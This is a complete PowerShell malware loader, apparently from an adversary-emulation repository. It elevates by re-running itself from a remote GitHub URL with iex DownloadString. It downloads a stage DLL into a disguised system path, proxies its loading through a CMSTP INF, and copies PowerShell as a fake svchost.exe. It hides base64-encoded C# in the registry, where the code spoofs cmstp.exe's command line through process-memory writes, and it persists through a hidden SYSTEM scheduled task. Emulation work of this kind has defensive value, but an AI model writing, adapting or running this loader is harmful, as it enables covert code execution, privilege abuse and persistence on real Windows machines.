param()

# -- CONFIG: set this to the raw URL of the directory containing stage.dll --
#   i.e. the 'github/' folder uploaded to your repo (see Makefile sync target)
#   Example: https://raw.githubusercontent.com/<user>/<repo>/main/scenario-01-rmm/github
$scriptBase = "https://github.com/Justanother-engineer/scenario1/raw/refs/heads/main"

# -- Elevation Gate ----------------------------------------------
$isAdmin = [Security.Principal.WindowsPrincipal]::new(
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] Not admin. Requesting elevation via UAC..."
    $scriptUrl = "$scriptBase/loader.ps1?t=$(Get-Date -Format 'yyyyMMddHHmmss')"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
        "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
    ))
    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -Enc $b64"
    exit
}

Write-Host "[*] Running with admin privileges. Proceeding..."

# -- Logging -----------------------------------------------------
$logFile = "C:\ProgramData\loader.log"
function Write-Log($msg) {
    $parent = Split-Path $logFile -Parent
    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
    "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
}

Write-Log "[*] loader.ps1 started - admin=True"

# Configuration
$githubBase = $scriptBase
$stageUrl = "$githubBase/stage.dll"
$stagePath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
$infPath = "C:\ProgramData\config.inf"
$masqueradeSrc = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$masqueradeDst = "C:\ProgramData\Microsoft\Windows\Caches\svchost.exe"
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer"
$regName = "App"
$taskName = "SecHealthSvc"

# Create scatter directories
Write-Log "[*] Creating scatter directories..."
try {
    New-Item -Path "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    New-Item -Path "C:\ProgramData\Microsoft\Windows\Caches" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Log "[+] Scatter directories created"
} catch {
    Write-Log "[-] Failed to create scatter directories: $_"
}

# 1. Download stage.dll
Write-Host "[*] Downloading stage.dll..."
Write-Log "[*] Downloading stage.dll from $stageUrl"
try {
    Invoke-WebRequest -Uri $stageUrl -OutFile $stagePath -UseBasicParsing -ErrorAction Stop
    if (Test-Path $stagePath) {
        $bytes = (Get-Item $stagePath).Length
        Write-Log "[+] stage.dll downloaded - $bytes bytes (verified)"
    } else {
        Write-Log "[-] stage.dll download FAILED: file not found after download"
    }
} catch {
    Write-Log "[-] stage.dll download FAILED: $_"
}

# 2. Write config.inf
Write-Log "[*] Writing config.inf..."
$infContent = @"
[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
RegisterOCXs=RegisterStage

[RegisterStage]
$stagePath
"@
try {
    Set-Content -Path $infPath -Value $infContent -Force -ErrorAction Stop
    if (Test-Path $infPath) {
        Write-Log "[+] config.inf written - verified"
    } else {
        Write-Log "[-] config.inf write FAILED: file not found after write"
    }
} catch {
    Write-Log "[-] config.inf write FAILED: $_"
}

# 3. Masquerade PowerShell
Write-Log "[*] Masquerading PowerShell -> svchost.exe..."
try {
    Copy-Item -Path $masqueradeSrc -Destination $masqueradeDst -Force -ErrorAction Stop
    if (Test-Path $masqueradeDst) {
        $mbytes = (Get-Item $masqueradeDst).Length
        Write-Log "[+] Masquerade OK - $masqueradeDst ($mbytes bytes)"
    } else {
        Write-Log "[-] Masquerade FAILED: file not found after copy"
    }
} catch {
    Write-Log "[-] Masquerade FAILED: $_"
}

# 4. Stage C# execution wrapper in HKLM
Write-Log "[*] Encoding C# source and writing registry payload..."
$spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CgpwdWJsaWMgc3RhdGljIGNsYXNzIFNwb29mCnsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2Vzc1coCiAgICAgICAgc3RyaW5nIGxwQXBwbGljYXRpb25OYW1lLAogICAgICAgIHN0cmluZyBscENvbW1hbmRMaW5lLAogICAgICAgIEludFB0ciBscFByb2Nlc3NBdHRyaWJ1dGVzLAogICAgICAgIEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsCiAgICAgICAgYm9vbCBiSW5oZXJpdEhhbmRsZXMsCiAgICAgICAgdWludCBkd0NyZWF0aW9uRmxhZ3MsCiAgICAgICAgSW50UHRyIGxwRW52aXJvbm1lbnQsCiAgICAgICAgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwKICAgICAgICByZWYgU1RBUlRVUElORk8gbHBTdGFydHVwSW5mbywKICAgICAgICBvdXQgUFJPQ0VTU19JTkZPUk1BVElPTiBscFByb2Nlc3NJbmZvcm1hdGlvbik7CgogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MoCiAgICAgICAgSW50UHRyIGhQcm9jZXNzLAogICAgICAgIGludCBQcm9jZXNzSW5mb3JtYXRpb25DbGFzcywKICAgICAgICBvdXQgUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTiBwYmksCiAgICAgICAgaW50IGNiLAogICAgICAgIG91dCBpbnQgcmV0dXJuTGVuZ3RoKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgUnRsR2V0VmVyc2lvbihyZWYgT1NWRVJTSU9OSU5GT0VYVyBscFZlcnNpb25JbmZvKTsKCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBPU1ZFUlNJT05JTkZPRVhXCiAgICB7CiAgICAgICAgcHVibGljIHVpbnQgZHdPU1ZlcnNpb25JbmZvU2l6ZTsKICAgICAgICBwdWJsaWMgdWludCBkd01ham9yVmVyc2lvbjsKICAgICAgICBwdWJsaWMgdWludCBkd01pbm9yVmVyc2lvbjsKICAgICAgICBwdWJsaWMgdWludCBkd0J1aWxkTnVtYmVyOwogICAgICAgIHB1YmxpYyB1aW50IGR3UGxhdGZvcm1JZDsKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBXU3RyKV0KICAgICAgICBwdWJsaWMgc3RyaW5nIHN6Q1NEVmVyc2lvbjsKICAgICAgICBwdWJsaWMgdXNob3J0IHdTZXJ2aWNlUGFja01ham9yOwogICAgICAgIHB1YmxpYyB1c2hvcnQgd1NlcnZpY2VQYWNrTWlub3I7CiAgICAgICAgcHVibGljIHVzaG9ydCB3U3VpdGVNYXNrOwogICAgICAgIHB1YmxpYyBieXRlIHdQcm9kdWN0VHlwZTsKICAgICAgICBwdWJsaWMgYnl0ZSB3UmVzZXJ2ZWQ7CiAgICB9CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBSZWFkUHJvY2Vzc01lbW9yeSgKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgSW50UHRyIGxwQmFzZUFkZHJlc3MsCiAgICAgICAgW091dF0gYnl0ZVtdIGxwQnVmZmVyLAogICAgICAgIGludCBkd1NpemUsCiAgICAgICAgb3V0IGludCBscE51bWJlck9mQnl0ZXNSZWFkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeSgKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgSW50UHRyIGxwQmFzZUFkZHJlc3MsCiAgICAgICAgYnl0ZVtdIGxwQnVmZmVyLAogICAgICAgIGludCBkd1NpemUsCiAgICAgICAgb3V0IGludCBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IFJlc3VtZVRocmVhZChJbnRQdHIgaFRocmVhZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgcHJpdmF0ZSBjb25zdCB1aW50IENSRUFURV9TVVNQRU5ERUQgPSAweDAwMDAwMDA0OwogICAgcHJpdmF0ZSBjb25zdCBpbnQgUHJvY2Vzc0Jhc2ljSW5mb3JtYXRpb24gPSAwOwoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgIHByaXZhdGUgc3RydWN0IFNUQVJUVVBJTkZPCiAgICB7CiAgICAgICAgcHVibGljIGludCBjYjsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7CiAgICAgICAgcHVibGljIHN0cmluZyBscERlc2t0b3A7CiAgICAgICAgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgICAgIHB1YmxpYyBpbnQgZHdYOwogICAgICAgIHB1YmxpYyBpbnQgZHdZOwogICAgICAgIHB1YmxpYyBpbnQgZHdYU2l6ZTsKICAgICAgICBwdWJsaWMgaW50IGR3WVNpemU7CiAgICAgICAgcHVibGljIGludCBkd1hDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBpbnQgZHdZQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgaW50IGR3RmlsbEF0dHJpYnV0ZTsKICAgICAgICBwdWJsaWMgaW50IGR3RmxhZ3M7CiAgICAgICAgcHVibGljIHNob3J0IHdTaG93V2luZG93OwogICAgICAgIHB1YmxpYyBzaG9ydCBjYlJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgRXhpdFN0YXR1czsKICAgICAgICBwdWJsaWMgSW50UHRyIFBlYkJhc2VBZGRyZXNzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgQWZmaW5pdHlNYXNrOwogICAgICAgIHB1YmxpYyBJbnRQdHIgQmFzZVByaW9yaXR5OwogICAgICAgIHB1YmxpYyBJbnRQdHIgVW5pcXVlUHJvY2Vzc0lkOwogICAgICAgIHB1YmxpYyBJbnRQdHIgSW5oZXJpdGVkRnJvbVVuaXF1ZVByb2Nlc3NJZDsKICAgIH0KCiAgICBwcml2YXRlIGNvbnN0IGludCBDb21tYW5kTGluZU9mZnNldEZhbGxiYWNrID0gMHg3MDsKCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIExvZyhzdHJpbmcgbXNnKQogICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgc3RyaW5nIGxvZ1BhdGggPSBAIkM6XFByb2dyYW1EYXRhXGxvYWRlci5sb2ciOwogICAgICAgICAgICBzdHJpbmcgbGluZSA9IERhdGVUaW1lLk5vdy5Ub1N0cmluZygiW3l5eXktTU0tZGQgSEg6bW06c3NdICIpICsgbXNnOwogICAgICAgICAgICBGaWxlLkFwcGVuZEFsbFRleHQobG9nUGF0aCwgbGluZSArIEVudmlyb25tZW50Lk5ld0xpbmUpOwogICAgICAgIH0KICAgICAgICBjYXRjaCB7IH0KICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgR28oKQogICAgewogICAgICAgIHN0cmluZyBzcG9vZmVkQ21kID0gImNtc3RwLmV4ZSAvcyBDOlxcV2luZG93c1xcU3lzdGVtMzJcXGNtc3RwLmluZiI7CiAgICAgICAgc3RyaW5nIHJlYWxDbWQgPSAiY21zdHAuZXhlIC9zIEM6XFxQcm9ncmFtRGF0YVxcY29uZmlnLmluZiI7CgogICAgICAgIE9TVkVSU0lPTklORk9FWFcgb3N2aSA9IG5ldyBPU1ZFUlNJT05JTkZPRVhXKCk7CiAgICAgICAgb3N2aS5kd09TVmVyc2lvbkluZm9TaXplID0gKHVpbnQpTWFyc2hhbC5TaXplT2Yob3N2aSk7CiAgICAgICAgUnRsR2V0VmVyc2lvbihyZWYgb3N2aSk7CiAgICAgICAgaW50IGNvbW1hbmRMaW5lT2Zmc2V0ID0gb3N2aS5kd0J1aWxkTnVtYmVyID49IDIyNjIxID8gMHg4MCA6IENvbW1hbmRMaW5lT2Zmc2V0RmFsbGJhY2s7CiAgICAgICAgTG9nKCJbK10gT1MgYnVpbGQgIiArIG9zdmkuZHdCdWlsZE51bWJlciArICIg4oaSIENvbW1hbmRMaW5lT2Zmc2V0ID0gMHgiICsgY29tbWFuZExpbmVPZmZzZXQuVG9TdHJpbmcoIngiKSk7CgogICAgICAgIFNUQVJUVVBJTkZPIHNpID0gbmV3IFNUQVJUVVBJTkZPKCk7CiAgICAgICAgc2kuY2IgPSBNYXJzaGFsLlNpemVPZih0eXBlb2YoU1RBUlRVUElORk8pKTsKCiAgICAgICAgUFJPQ0VTU19JTkZPUk1BVElPTiBwaTsKCiAgICAgICAgTG9nKCJbKl0gQ3JlYXRpbmcgc3VzcGVuZGVkIGNtc3RwLmV4ZS4uLiIpOwogICAgICAgIGlmICghQ3JlYXRlUHJvY2Vzc1cobnVsbCwgc3Bvb2ZlZENtZCwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLCBmYWxzZSwKICAgICAgICAgICAgQ1JFQVRFX1NVU1BFTkRFRCwgSW50UHRyLlplcm8sIG51bGwsIHJlZiBzaSwgb3V0IHBpKSkKICAgICAgICB7CiAgICAgICAgICAgIGludCBlcnIgPSBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCk7CiAgICAgICAgICAgIExvZygiWy1dIENyZWF0ZVByb2Nlc3NXIEZBSUxFRCAoZXJyb3IgIiArIGVyciArICIpIik7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgTG9nKCJbK10gY21zdHAuZXhlIGNyZWF0ZWQgKFBJRD0iICsgcGkuZHdQcm9jZXNzSWQgKyAiKSIpOwoKICAgICAgICBpbnQgcmV0TGVuOwogICAgICAgIFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04gcGJpOwogICAgICAgIGlmIChOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzKHBpLmhQcm9jZXNzLCBQcm9jZXNzQmFzaWNJbmZvcm1hdGlvbiwKICAgICAgICAgICAgb3V0IHBiaSwgTWFyc2hhbC5TaXplT2YodHlwZW9mKFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04pKSwKICAgICAgICAgICAgb3V0IHJldExlbikgIT0gMCkKICAgICAgICB7CiAgICAgICAgICAgIExvZygiWy1dIE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MgRkFJTEVEIik7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBMb2coIlsrXSBQRUIgbG9jYXRlZCIpOwoKICAgICAgICBieXRlW10gcGViQnVmZmVyID0gbmV3IGJ5dGVbSW50UHRyLlNpemUgKiA0XTsKICAgICAgICBpbnQgYnl0ZXNSZWFkOwogICAgICAgIGlmICghUmVhZFByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIHBiaS5QZWJCYXNlQWRkcmVzcywgcGViQnVmZmVyLCBwZWJCdWZmZXIuTGVuZ3RoLCBvdXQgYnl0ZXNSZWFkKSkKICAgICAgICB7CiAgICAgICAgICAgIExvZygiWy1dIFJlYWRQcm9jZXNzTWVtb3J5KFBFQikgRkFJTEVEIik7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBMb2coIlsrXSBQRUIgcmVhZCIpOwoKICAgICAgICBpbnQgcHBPZmZzZXQgPSBJbnRQdHIuU2l6ZSA9PSA4ID8gMHgyMCA6IDB4MTA7CiAgICAgICAgSW50UHRyIHByb2Nlc3NQYXJhbWV0ZXJzUHRyID0gTWFyc2hhbC5SZWFkSW50UHRyKHBlYkJ1ZmZlciwgcHBPZmZzZXQpOwoKICAgICAgICBieXRlW10gY21kQnVmZmVyID0gbmV3IGJ5dGVbMTZdOwogICAgICAgIGlmICghUmVhZFByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIEludFB0ci5BZGQocHJvY2Vzc1BhcmFtZXRlcnNQdHIsIGNvbW1hbmRMaW5lT2Zmc2V0KSwgY21kQnVmZmVyLCBjbWRCdWZmZXIuTGVuZ3RoLCBvdXQgYnl0ZXNSZWFkKSkKICAgICAgICB7CiAgICAgICAgICAgIExvZygiWy1dIFJlYWRQcm9jZXNzTWVtb3J5KGNtZFB0cikgRkFJTEVEIik7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBMb2coIlsrXSBDb21tYW5kIGxpbmUgcG9pbnRlciByZWFkIik7CgogICAgICAgIGJ5dGVbXSBuZXdDbWRCeXRlcyA9IEVuY29kaW5nLlVuaWNvZGUuR2V0Qnl0ZXMocmVhbENtZCk7CiAgICAgICAgSW50UHRyIGJ1ZmZlclB0ciA9IE1hcnNoYWwuUmVhZEludFB0cihjbWRCdWZmZXIsIDgpOwoKICAgICAgICBpbnQgd3JpdHRlbjsKICAgICAgICBpZiAoIVdyaXRlUHJvY2Vzc01lbW9yeShwaS5oUHJvY2VzcywgYnVmZmVyUHRyLCBuZXdDbWRCeXRlcywgbmV3Q21kQnl0ZXMuTGVuZ3RoLCBvdXQgd3JpdHRlbikpCiAgICAgICAgewogICAgICAgICAgICBMb2coIlstXSBXcml0ZVByb2Nlc3NNZW1vcnkoY21kKSBGQUlMRUQiKTsKICAgICAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIExvZygiWytdIENvbW1hbmQgbGluZSBvdmVyd3JpdHRlbjogY29uZmlnLmluZiIpOwoKICAgICAgICBieXRlW10gbGVuZ3RoQnl0ZXMgPSBCaXRDb252ZXJ0ZXIuR2V0Qnl0ZXMobmV3Q21kQnl0ZXMuTGVuZ3RoKTsKICAgICAgICBieXRlW10gbWF4TGVuZ3RoQnl0ZXMgPSBCaXRDb252ZXJ0ZXIuR2V0Qnl0ZXMobmV3Q21kQnl0ZXMuTGVuZ3RoKTsKICAgICAgICBCdWZmZXIuQmxvY2tDb3B5KGxlbmd0aEJ5dGVzLCAwLCBjbWRCdWZmZXIsIDAsIDIpOwogICAgICAgIEJ1ZmZlci5CbG9ja0NvcHkobWF4TGVuZ3RoQnl0ZXMsIDAsIGNtZEJ1ZmZlciwgMiwgMik7CiAgICAgICAgV3JpdGVQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBJbnRQdHIuQWRkKHByb2Nlc3NQYXJhbWV0ZXJzUHRyLCBjb21tYW5kTGluZU9mZnNldCksIGNtZEJ1ZmZlciwgY21kQnVmZmVyLkxlbmd0aCwgb3V0IHdyaXR0ZW4pOwogICAgICAgIExvZygiWytdIENvbW1hbmQgbGluZSBsZW5ndGggdXBkYXRlZCIpOwoKICAgICAgICBMb2coIlsqXSBSZXN1bWluZyBjbXN0cC5leGUgdGhyZWFkLi4uIik7CiAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICBMb2coIlsrXSBjbXN0cC5leGUgcmVzdW1lZCwgYXJndW1lbnQgc3Bvb2ZpbmcgY29tcGxldGUiKTsKICAgIH0KfQo="
$spoofBytes = [Convert]::FromBase64String($spoofBase64)
$spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)

# Wrap C# in Add-Type so iex will compile + call it
$regValue = @"
function Get-Ts { [DateTime]::Now.ToString('[yyyy-MM-dd HH:mm:ss]') }

"`$(Get-Ts) [*] Task payload executing (svchost.exe)" | Out-File C:\ProgramData\loader.log -Append
try {
    "`$(Get-Ts) [*] Compiling C# (Add-Type)..." | Out-File C:\ProgramData\loader.log -Append
    Add-Type -TypeDefinition @'
$spoofSource
'@ -Language CSharp
    "`$(Get-Ts) [+] C# compiled successfully, calling Spoof::Go()" | Out-File C:\ProgramData\loader.log -Append
    [Spoof]::Go()
    "`$(Get-Ts) [+] Spoof::Go() completed" | Out-File C:\ProgramData\loader.log -Append
} catch {
    "`$(Get-Ts) [-] Task payload FAILED: `$_" | Out-File C:\ProgramData\loader.log -Append
    "`$(Get-Ts) [-] Type: `$(`$_.Exception.GetType().FullName)" | Out-File C:\ProgramData\loader.log -Append
}
"@

if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
$checkVal = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
if ($checkVal) {
    Write-Log "[+] Registry payload stored at $regPath\$regName - $($checkVal.Length) chars (verified)"
} else {
    Write-Log "[-] Registry payload FAILED"
}

# 5. Create scheduled task with dynamic time via Register-ScheduledTask
Write-Log "[*] Creating scheduled task (Register-ScheduledTask)..."
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    "iex(gp '$regPath').$regName"
))
$action = New-ScheduledTaskAction -Execute $masqueradeDst -Argument "-NoP -Enc $b64"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::FromMinutes(5))
try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
    Write-Log "[+] Task $taskName created (verified)"
    Write-Host "[+] Scheduled. Waiting 2m for execution..."
    Start-ScheduledTask -TaskName $taskName
    Write-Log "[*] Task $taskName triggered"
} catch {
    Write-Log "[-] Task creation FAILED`n$_"
}

# 6. Poll for execution evidence
Write-Log "[*] Task $taskName triggered, polling for execution..."
$svchostDetected = $false
$cmstpDetected = $false
for ($i = 0; $i -lt 12; $i++) {
    Start-Sleep -Seconds 5
    $svchost = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $masqueradeDst }
    if ($svchost -and -not $svchostDetected) {
        Write-Log "[+] svchost.exe detected (PID $($svchost.Id)) - task is executing"
        $svchostDetected = $true
    }
    $cmstp = Get-Process -Name "cmstp" -ErrorAction SilentlyContinue
    if ($cmstp -and -not $cmstpDetected) {
        Write-Log "[+] cmstp.exe detected (PID $($cmstp.Id)) - stage.dll being loaded"
        $cmstpDetected = $true
    }
    if ($svchostDetected -and $cmstpDetected) { break }
}
if (-not $svchostDetected) { Write-Log "[-] svchost.exe never detected within 60s timeout" }
if (-not $cmstpDetected) { Write-Log "[-] cmstp.exe never detected - stage.dll may not have loaded" }
